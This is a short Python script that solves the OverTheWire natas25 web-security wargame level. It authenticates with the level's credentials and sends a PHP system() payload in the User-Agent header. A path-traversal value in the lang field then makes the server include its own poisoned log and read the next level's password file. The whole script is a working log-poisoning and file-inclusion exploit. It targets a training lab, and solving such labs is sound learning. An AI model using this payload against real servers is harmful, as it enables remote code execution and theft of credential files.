# Name: Michael Krakovsky
# Date: April 27, 2019
# Description: Create a script to break the code on natas25.
# Version: 1.0

from requests import Session
from pyperclip import copy

username = "natas25"
passwd = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
url = "http://natas25.natas.labs.overthewire.org/"      # This is how we turn on the debug variables.

session = Session()

getResponse = session.get(url, auth=(username, passwd))   # We desire to create a session ID.
headers = {"User-Agent":"<?php system('cat /etc/natas_webpass/natas26'); ?>"}
getResponse = session.post(url, headers=headers, data={"lang" : "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + getResponse.cookies['PHPSESSID'] + ".log"}, auth=(username, passwd))
print(getResponse.text)
print(50 * '-')
copy(getResponse.text)